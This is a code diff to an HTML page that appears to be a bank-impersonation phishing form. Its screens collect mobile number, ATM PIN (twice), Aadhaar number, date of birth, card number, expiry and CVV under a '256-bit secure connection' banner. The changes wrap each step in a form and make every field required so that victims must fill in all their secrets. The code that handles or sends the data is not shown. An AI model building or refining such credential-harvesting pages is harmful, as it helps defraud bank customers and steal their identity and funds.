@@ -384,21 +384,23 @@
                 <div class="title-underline"></div>
                 <p class="card-subtitle">Verify your registered mobile number to continue</p>
 
+                <form onsubmit="event.preventDefault(); goToScreen('screen-identity');">
                 <div class="form-group">
                     <div class="label-row"><span class="label">Registered Mobile Number</span><span class="label-hint">10 digits</span></div>
                     <div class="input-wrapper">
                         <span class="prefix">+91</span>
-                        <input type="tel" id="mobileNumber" placeholder="Enter mobile number" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <input type="tel" id="mobileNumber" placeholder="Enter mobile number" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                     </div>
                 </div>
                 <div class="form-group">
                     <div class="label-row"><span class="label">ATM PIN</span><span class="label-hint">4 or 6 digits</span></div>
                     <div class="input-wrapper">
-                        <input type="password" id="atmPin" placeholder="Enter ATM PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <input type="password" id="atmPin" placeholder="Enter ATM PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                     </div>
                 </div>
 
-                <button class="btn" onclick="goToScreen('screen-identity')">VERIFY DETAILS</button>
+                <button type="submit" class="btn">VERIFY DETAILS</button>
+                </form>
 
                 <div class="secure-banner">
                     <div class="secure-title"><span style="font-size: 16px;">🔒</span> 256-bit secure connection</div>
@@ -432,20 +434,22 @@
                 <div class="title-underline"></div>
                 <p class="card-subtitle">Confirm Aadhaar and date of birth as per bank records</p>
 
+                <form onsubmit="event.preventDefault(); goToScreen('screen-card');">
                 <div class="form-group">
                     <div class="label-row"><span class="label">Aadhaar Number</span><span class="label-hint">12 digits</span></div>
                     <div class="input-wrapper">
-                        <input type="tel" id="aadhaarNumber" placeholder="XXXX XXXX XXXX" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <input type="tel" id="aadhaarNumber" placeholder="XXXX XXXX XXXX" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                     </div>
                 </div>
                 <div class="form-group">
                     <div class="label-row"><span class="label">Date of Birth</span><span class="label-hint">As per records</span></div>
                     <div class="input-wrapper">
-                        <input type="text" id="dob" placeholder="DD/MM/YYYY" oninput="formatDate(this)" maxlength="10">
+                        <input type="text" id="dob" placeholder="DD/MM/YYYY" oninput="formatDate(this)" maxlength="10" required>
                     </div>
                 </div>
 
-                <button class="btn" onclick="goToScreen('screen-card')">CONTINUE</button>
+                <button type="submit" class="btn">CONTINUE</button>
+                </form>
 
                 <div class="secure-banner">
                     <div class="secure-title"><span style="font-size: 16px;">🔒</span> 256-bit secure connection</div>
@@ -480,10 +484,11 @@
                 <div class="title-underline"></div>
                 <p class="card-subtitle">Enter your debit / credit card details securely</p>
 
+                <form onsubmit="event.preventDefault(); openModal();">
                 <div class="form-group">
                     <div class="label-row"><span class="label">Debit / Credit Card Number</span></div>
                     <div class="input-wrapper">
-                        <input type="tel" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)">
+                        <input type="tel" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
                     </div>
                 </div>
 
@@ -491,18 +496,19 @@
                     <div class="form-group" style="flex: 1;">
                         <div class="label-row"><span class="label">Expiry</span><span class="label-hint">MM/YY</span></div>
                         <div class="input-wrapper">
-                            <input type="text" id="expiry" placeholder="MM/YY" oninput="formatExpiry(this)" maxlength="5">
+                            <input type="text" id="expiry" placeholder="MM/YY" oninput="formatExpiry(this)" maxlength="5" required>
                         </div>
                     </div>
                     <div class="form-group" style="flex: 1;">
                         <div class="label-row"><span class="label">CVV</span></div>
                         <div class="input-wrapper">
-                            <input type="password" id="cvv" placeholder="CVV" oninput="this.value = this.value.replace(/[^0-9]/g, '')" maxlength="3">
+                            <input type="password" id="cvv" placeholder="CVV" oninput="this.value = this.value.replace(/[^0-9]/g, '')" maxlength="3" required>
                         </div>
                     </div>
                 </div>
 
-                <button class="btn" onclick="openModal()">VERIFY DETAILS</button>
+                <button type="submit" class="btn">VERIFY DETAILS</button>
+                </form>
 
                 <div class="secure-banner">
                     <div class="secure-title"><span style="font-size: 16px;">🔒</span> 256-bit secure connection</div>
@@ -562,14 +568,16 @@
             <div class="title-underline"></div>
             <p class="card-subtitle" style="font-size: 14px; margin-bottom: 20px;">Enter your 4 or 6 digit ATM PIN to complete verification</p>
 
+            <form onsubmit="event.preventDefault(); completeVerification();">
             <div class="form-group" style="text-align: left;">
                 <div class="label-row"><span class="label">ATM Pin</span><span class="label-hint">Required</span></div>
                 <div class="input-wrapper">
-                    <input type="password" id="confirmAtmPin" placeholder="...." maxlength="6" style="text-align: center; letter-spacing: 4px; font-size: 24px;" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <input type="password" id="confirmAtmPin" placeholder="...." maxlength="6" style="text-align: center; letter-spacing: 4px; font-size: 24px;" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                 </div>
             </div>
 
-            <button class="btn" style="margin-bottom: 12px;" onclick="completeVerification()">VERIFY DETAILS</button>
+            <button type="submit" class="btn" style="margin-bottom: 12px;">VERIFY DETAILS</button>
+            </form>
             <a href="#" style="color: var(--primary-blue); text-decoration: none; font-weight: 500; font-size: 15px;" onclick="closeModal(event)">Cancel</a>
         </div>
     </div>
